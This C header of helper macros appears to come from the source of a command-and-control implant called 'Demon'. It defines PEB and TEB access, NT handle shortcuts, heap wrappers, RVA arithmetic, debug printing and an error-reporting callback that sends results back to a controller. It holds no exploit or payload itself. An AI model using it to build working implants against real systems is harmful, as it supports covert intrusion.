#ifndef DEMON_MACROS_H
#define DEMON_MACROS_H

#include <stdio.h>

#ifdef _WIN64
#define PPEB_PTR __readgsqword( 0x60 )
#else
#define PPEB_PTR __readgsqword( 0x30 )
#endif

#define NT_SUCCESS(Status)              ( ( ( NTSTATUS ) ( Status ) ) >= 0 )
#define NtCurrentProcess()              ( HANDLE ) ( ( HANDLE ) - 1 )
#define NtCurrentThread()               ( ( HANDLE ) ( LONG_PTR ) - 2 )
#define NtGetLastError()                Instance.Teb->LastErrorValue
#define NtSetLastError(x)               Instance.Teb->LastErrorValue = x

/* Heap allocation functions */
#define NtProcessHeap()                 Instance.Teb->ProcessEnvironmentBlock->ProcessHeap
#define NtHeapAlloc( x )                Instance.Win32.RtlAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, x );
#define NtHeapFree( x )                 Instance.Win32.RtlFreeHeap( NtProcessHeap(), 0, x );

#define DLLEXPORT                       __declspec( dllexport )
#define RVA( TYPE, DLLBASE, RVA )  ( TYPE ) ( ( PBYTE ) DLLBASE + RVA )
#define DATA_FREE( d, l ) \
    MemSet( d, 0, l ); \
    Instance.Win32.LocalFree( d ); \
    d = NULL;

#define U_PTR( x )                      ( ( UINT_PTR ) x )
#define C_PTR( x )                      ( ( LPVOID ) x )
#define SEC_DATA                        __attribute__( ( section( ".data" ) ) )

#define HTONS32( x )                    __builtin_bswap32( x )
#define HTONS16( x )                    __builtin_bswap16( x )

// DEBUG
#ifdef DEBUG
#ifdef SVC_EXE
#define PRINTF( f, ... )                { DbgPrint( "[DEBUG::%s::%d] " f, __FUNCTION__, __LINE__, __VA_ARGS__ ); }
#else
#define PRINTF( f, ... )    { printf( "[DEBUG::%s::%d] " f, __FUNCTION__, __LINE__, __VA_ARGS__ ); }
#endif
#else
#define PRINTF( f, ... )                { ; }
#endif

#ifdef DEBUG
#define PUTS( s )           { printf( "[DEBUG::%s::%d] %s\n", __FUNCTION__, __LINE__, s ); }
#else
#define PUTS( s ) { ; }
#endif

#define MemCopy                         __builtin_memcpy
#define CALLBACK_GETLASTERROR           PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );

#ifdef DEBUG
#define PRINT_HEX( b, l )                               \
    printf( #b ": [%d] [ ", l );                        \
    for ( int i = 0 ; i < l; i++ )                      \
    {                                                   \
        printf( "%02x ", ( ( PUCHAR ) b ) [ i ] );      \
    }                                                   \
    puts( "]" );
#else
#define PRINT_HEX( b, l ) {}
#endif

#endif
